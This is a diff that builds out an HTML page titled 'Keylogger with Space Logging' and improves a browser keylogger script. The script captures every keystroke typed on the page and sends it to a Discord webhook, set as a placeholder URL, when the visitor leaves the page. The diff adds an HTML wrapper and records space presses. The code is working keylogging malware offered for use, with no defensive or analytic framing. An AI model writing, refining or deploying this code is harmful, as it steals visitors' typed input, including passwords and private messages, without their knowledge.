@@ -1,3 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger with Space Logging</title>
+</head>
+<body>
+
 <script>
     // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
     const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
@@ -6,7 +16,7 @@
 
     // Function to send keys to Discord webhook
     const sendKeysToDiscord = async () => {
-        const keys = keysPressed.join('');
+        const keys = keysPressed.map(key => key === ' ' ? 'space' : key).join('');
         const content = `Keys pressed: ${keys}`;
 
         try {
@@ -37,9 +47,14 @@
     window.addEventListener('keydown', (event) => {
         const key = event.key;
 
-        // Exclude some keys like Enter, Shift, etc. if needed
-        if (key !== 'Enter' && key !== 'Shift') {
-            keysPressed.push(key);
+        // Log 'space' when the space key is pressed
+        if (key === ' ') {
+            keysPressed.push('space');
+        } else {
+            // Exclude some keys like Enter, Shift, etc. if needed
+            if (key !== 'Enter' && key !== 'Shift') {
+                keysPressed.push(key);
+            }
         }
     });
 
@@ -49,3 +64,6 @@
     // Event listener for beforeunload (when the user leaves the page)
     window.addEventListener('beforeunload', sendKeysToDiscord);
 </script>
+
+</body>
+</html>
